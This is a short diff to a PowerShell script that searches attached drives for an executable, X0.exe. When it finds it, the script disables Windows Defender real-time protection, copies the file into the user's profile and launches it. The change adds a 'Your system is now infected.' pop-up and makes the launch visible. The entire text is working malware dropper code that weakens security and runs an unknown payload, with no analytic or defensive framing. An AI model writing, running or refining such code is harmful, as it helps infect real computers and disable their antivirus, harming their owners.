@@ -4,7 +4,8 @@ foreach ($drive in $drives) {
     if (Test-Path "${drive}:\EXECUTE\X0.exe") {
         Set-MpPreference -DisableRealtimeMonitoring $true
         cmd /c "copy ${drive}:\EXECUTE\X0.exe %userprofile%"
-        cmd /c "start /min %userprofile%\X0.exe"
+        cmd /c "msg * Your system is now infected."
+        cmd /c "start %userprofile%\X0.exe"
         exit
     }
 }
